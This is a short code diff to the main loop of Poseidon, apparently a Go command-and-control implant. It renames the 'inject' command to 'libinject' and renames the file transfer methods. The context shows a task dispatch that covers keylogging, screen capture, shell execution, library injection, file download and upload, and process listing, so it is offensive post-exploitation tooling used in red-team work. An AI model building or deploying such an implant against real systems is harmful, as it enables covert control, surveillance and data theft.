@@ -17,7 +17,7 @@ import (
 	"github.com/xorrior/poseidon/pkg/commands/ps"
 	"github.com/xorrior/poseidon/pkg/commands/screencapture"
 	"github.com/xorrior/poseidon/pkg/commands/shell"
-	"github.com/xorrior/poseidon/pkg/commands/inject"
+	"github.com/xorrior/poseidon/pkg/commands/libinject"
 	"github.com/xorrior/poseidon/pkg/commands/sshauth"
 	"github.com/xorrior/poseidon/pkg/commands/triagedirectory"
 	"github.com/xorrior/poseidon/pkg/profiles"
@@ -76,7 +76,7 @@ func main() {
 		"keylog":          3,
 		"download":        4,
 		"upload":          5,
-		"inject":          6,
+		"libinject":       6,
 		"ps":              7,
 		"sleep":           8,
 		"cat":             9,
@@ -118,7 +118,7 @@ LOOP:
 				break
 			case 4:
 				//File download
-				profile.Download(task, task.Params)
+				profile.SendFile(task, task.Params)
 				break
 			case 5:
 				// File upload
@@ -128,7 +128,7 @@ LOOP:
 					profile.PostResponse(task, err.Error())
 				}
 
-				data := profile.Upload(task, fileDetails.FileID)
+				data := profile.GetFile(task, fileDetails.FileID)
 				if len(data) > 0 {
 					f, e := os.Create(fileDetails.RemotePath)
 
@@ -148,7 +148,7 @@ LOOP:
 				break
 
 			case 6:
-				go inject.Run(task, res)
+				go libinject.Run(task, res)
 				break
 			case 7:
 				go ps.Run(task, res)
